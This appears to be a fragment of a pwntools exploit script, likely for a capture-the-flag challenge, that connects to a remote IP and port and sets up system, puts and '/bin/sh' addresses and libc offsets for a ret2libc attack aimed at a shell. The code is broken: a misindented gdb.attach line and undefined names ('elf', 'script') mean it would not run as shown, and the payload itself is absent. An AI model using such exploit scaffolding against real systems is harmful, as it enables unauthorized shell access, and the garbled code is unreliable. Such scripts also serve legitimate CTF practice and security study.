from pwn import *

context(log_level = "debug", os = "linux", arch = "i386")

#LIBC = "libc64.so"

tar = remote('149.248.7.48',9999)
#-----------------------------------------------------------------

    gdb.attach(tar, gdbscript = script)

def sh():
    tar.interactive()

#-----------------------------------------------------------------

system = elf.plt["system"]
puts = elf.plt["puts"]
puts_got = elf.got["puts"]
puts_off = 0x05f140
binsh_off = 0x15902b
